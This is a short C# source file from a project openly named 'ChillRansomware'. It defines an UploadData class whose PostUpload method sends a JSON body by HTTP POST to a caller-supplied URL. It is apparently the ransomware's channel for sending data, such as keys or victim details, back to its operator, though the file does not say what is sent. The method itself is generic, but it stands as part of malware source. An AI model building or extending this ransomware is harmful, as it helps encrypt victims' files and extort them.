using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace ChillRansomware
{
    class UploadData
    {
        //Maybe add a token authorization or something?
        public static void PostUpload(string Body, string Url)
        {
            WebRequest request = WebRequest.Create(Url);
            request.Method = "POST";
            byte[] byteArray = Encoding.UTF8.GetBytes(Body);
            request.ContentLength = byteArray.Length;
            request.ContentType = "application/json";

            Stream dataStream = request.GetRequestStream();
            dataStream.Write(byteArray, 0, byteArray.Length);

            WebResponse response = request.GetResponse();
        }
    }
}
